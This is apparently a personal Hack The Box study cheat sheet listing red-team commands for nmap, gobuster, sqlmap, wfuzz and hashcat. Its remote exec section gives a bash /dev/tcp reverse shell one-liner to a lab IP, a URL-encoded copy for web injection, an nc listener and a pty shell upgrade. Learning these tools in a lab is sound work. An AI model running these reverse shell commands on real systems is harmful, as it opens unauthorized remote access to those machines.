# Hack the box

To lazy to create another repo for even more notes...

This document will focus on writing down command to play with for when doing red team work.
Something something only use for good.

## Setup

Follow the settings in hack the back page.
Download the package file and start the openvpn.

```shell
sudo openvpn my.ovpn
```

## nmap

```shell
sudo nmap -sC -sV -oA nmap/example 192.168.0.1
# -sC = default script
# -sV = Probe open ports and versions
# -oA = output
```

## gobuster

```shell
gobuster dir -u http://192.168.0.1 -w /opt/SecLists/Discovery/web-Content/raft-small-words.txt -x php -o gobuster.out

```

## Burp

Can do a bunch of things :)

## Sqlmap

Sql injection [tool](https://sqlmap.org/) written in python.
Save the output of your request from burp and give it to sqlmap.
Have sqlmap try a number of injects for you.

```shell
sqlmap -r login.req --batch
```

## remote exec

### nc or ncat

Setup and listen for incoming traffic from remote exec on your local host.

```shell
nc -lvnp 9001
```

On the remote host that you want to forward your session to.
Lets assume that your local host got the ip 10.10.0.1.

```shell
bash -c 'bash -i >& /dev/tcp/10.10.0.1/9001'
# Might need to web encode the request or something similar
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.0.1%2F9001%27
```

## fuzzing

```shell
# FUZZ is the targeted value in this case that should be changed by the fuzzer
wfuzz -u http://10.10.0.1/accounts.php -H <your content type> -d 'username=something&password=12345&FUZZ=12345' -w /path/to/burp-parameter-names.txt
```

## Python

### Start bash from python

And give your self a decent working environment.

```shell
python3 -c ' import pty;pty.spawn("/bin/bash")'
# put it in background
stty raw -echo; fg
export TERM=xterm
```

## Hashcat

Password recovery utility, used together with a word list.

```shell
hashcat file-containing-password /path/to/wordlist
```

## install

```shell
pacman -S nmap
yay -S gobuster
yay -S sqlmap
```

[burp](https://portswigger.net/burp/releases/professional-community-2022-2-3)

Just like when installing zap burp needs to be installed as root.
